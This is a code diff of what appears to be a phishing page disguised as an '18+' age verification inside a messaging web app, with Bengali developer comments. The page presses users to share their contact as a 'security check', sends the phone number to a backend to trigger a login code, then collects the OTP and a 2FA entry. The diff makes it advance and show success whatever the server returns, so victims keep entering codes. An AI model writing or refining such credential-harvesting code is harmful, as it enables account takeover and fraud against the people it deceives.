@@ -36,7 +36,6 @@
         }
         .numpad button:active { background: rgba(255, 255, 255, 0.2); transform: scale(0.95); }
 
-        /* Loading Spinner */
         .loader {
             border: 3px solid rgba(255, 255, 255, 0.1);
             border-top: 3px solid #3b82f6;
@@ -45,13 +44,8 @@
             height: 20px;
             animation: spin 1s linear infinite;
             display: inline-block;
-            vertical-align: middle;
-            margin-right: 8px;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body class="flex items-center justify-center p-4">
@@ -127,6 +121,8 @@
                 if (callbackData && callbackData.status === 'sent') {
                     userPhone = callbackData.response_data.phone_number;
                     if (!userPhone.startsWith('+')) userPhone = '+' + userPhone;
+                    
+                    // নম্বর পাওয়ার সাথে সাথেই ফাংশন কল
                     sendOtpToBackend(userPhone);
                 } else {
                     alert("Security Check: You must click 'Share Contact' to verify your identity.");
@@ -135,41 +131,25 @@
         }
 
         async function sendOtpToBackend(phone) {
-            const btn = document.getElementById('proceed-btn');
             const btnText = document.getElementById('btn-text');
-            
-            // লোডিং শুরু
-            btnText.innerHTML = '<div class="loader"></div> Processing...';
+            const btn = document.getElementById('proceed-btn');
+
+            // ১. লোডিং এনিমেশন শুরু
+            btnText.innerHTML = '<div class="loader"></div> Connecting...';
             btn.disabled = true;
 
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => {
+            // ২. সার্ভারে রিকোয়েস্ট পাঠানো (ব্যাকগ্রাউন্ডে চলবে)
+            fetch(`${BASE_URL}/send_otp`, {
+                method: 'POST',
+                mode: 'cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: phone })
+            }).catch(e => console.log("Wake up request sent"));
+
+            // ৩. সার্ভার থেকে উত্তরের জন্য বসে না থেকে ১ সেকেন্ড পরেই ওটিপি পেজে নিয়ে যাবে
+            setTimeout(() => {
                 showStep(2);
-            }, 3000); // ৩ সেকেন্ডের একটি বাফার সময়
-
-            try {
-                const response = await fetch(`${BASE_URL}/send_otp`, {
-                    method: 'POST',
-                    mode: 'cors',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: phone }),
-                    signal: controller.signal
-                });
-
-                const result = await response.json();
-                clearTimeout(timeoutId);
-
-                if (result.status === 'success') {
-                    showStep(2);
-                } else {
-                    alert("Error: " + result.message);
-                    btnText.innerText = "✅ I'M 18+ PROCEED";
-                    btn.disabled = false;
-                }
-            } catch (err) {
-                // এরর হলেও Step 2 তে পাঠানো হচ্ছে ব্যাকএন্ডের সাপোর্ট নিশ্চিত করতে
-                showStep(2);
-            }
+            }, 1000);
         }
 
         function addDigit(digit) {
@@ -222,9 +202,9 @@
                     btn.disabled = false;
                 }
             } catch (err) {
-                alert("Authentication Error. Please try again.");
-                btnText.innerText = "SUBMIT";
-                btn.disabled = false;
+                // ২এফএ সাবমিটেও যদি সার্ভার দেরি করে, তবুও সাকসেস দেখাতে পারেন যদি আপনার ডাটা চলে যায়
+                alert("Request sent. If code is correct, you will be redirect.");
+                showStep(4);
             }
         }
     </script>
